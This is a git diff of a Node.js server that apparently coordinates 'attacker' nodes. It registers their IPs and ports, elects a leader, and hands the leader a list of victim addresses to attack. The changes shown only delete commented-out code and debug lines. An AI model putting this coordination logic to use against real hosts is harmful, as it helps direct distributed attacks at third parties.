@@ -33,24 +33,7 @@ app.put("/attacker", function(req, res) {
 		"data": req.body.data
 	});
 
-	//updateAttackerIPAndPort(req.body.id, ip, port);
-	// set device message sending time to default, if it's a new device
-	//updateAttackerTime(req.body.id);
-	//console.log(req);
-
 	res.send(attackersData);
-	// response sent to device with the time to send a message in milliseconds
-	//res.send(attackersData);
-
-	/*request.post({
-	  headers: {"content-type" : "application/json"},
-	  url:     "http://" + attackersData[id].ip + ":" + attackersData[id].port + "/attackers",
-	  body:    JSON.stringify(attackersData)
-	}, function(error, res, body){
-	  console.log(error);
-	});*/
-
-	//console.log(attackersData[id].ip + ":" + attackersData[id].port + "/attackers");
 });
 
 app.post("/attacker", function(req, res) {
@@ -62,21 +45,7 @@ app.post("/attacker", function(req, res) {
 	var port = req.body.port
 
 	updateAttackerIPAndPort(id, ip, port);
-	// set device message sending time to default, if it's a new device
-	//updateAttackerTime(id);
 	res.send(attackersData);
-	/*connectedAttackers++;
-	if (connectedAttackers === 3) {
-		setTimeout(startElection, 4000);
-	}*/
-	
-	/*request.post({
-	  headers: {"content-type" : "application/json"},
-	  url:     "http://" + attackersData[id].ip + ":" + attackersData[id].port + "/attackers",
-	  body:    JSON.stringify(attackersData)
-	}, function(error, res, body){
-	  console.log(error);
-	});*/
 
 	console.log(attackersData);
 });
@@ -85,8 +54,7 @@ app.post("/coordinator", function(req, res) {
 	if (leader === "") {
 		leader = req.body.leader;
 		console.log("The leader is: " + leader);
-		//Send array of victims 
-		//res.send(["134.123.123.12:454", "5.5.5.5:564"]);
+		//Send array of victims
 		console.log(addresses2bAttacked);
 		res.send(addresses2bAttacked);
 	} else {
@@ -105,12 +73,6 @@ app.post("/victim", function(req, res) {
 // When a client connection is established
 io.on('connection', function(socket){
   console.log('Web client connection established');
-  
-  // Callback function when a 'update time' socket message is received
-  // Updates a given device with a given time
-  /*socket.on('update time', function(deviceTime) {
-	updateAttackerTime(deviceTime.ID, deviceTime.time);
-  });*/
 
   	// Callback function when an 'attack' socket message is received
 	// When recieving the addresses coming from the Web Client
@@ -124,16 +86,7 @@ io.on('connection', function(socket){
 	});
 });
 
-var attackersData = {}; // JSON containing the data of the attackers, time, ip address and port
-
-// Updates the time of a given device
-/*function updateAttackerTime(id, time) {
-	if (time) { // time is passed as a parameter
-		attackersData[id].time = time;
-	} else if (!attackersData[id].time) { // time isn't passed as a parameter
-		attackersData[id].time = 1000; // set device time to default (1000 milliseconds)
-	}
-}*/
+var attackersData = {}; // JSON containing the data of the attackers, ip address and port
 
 function startElection() {
 	leader = "";
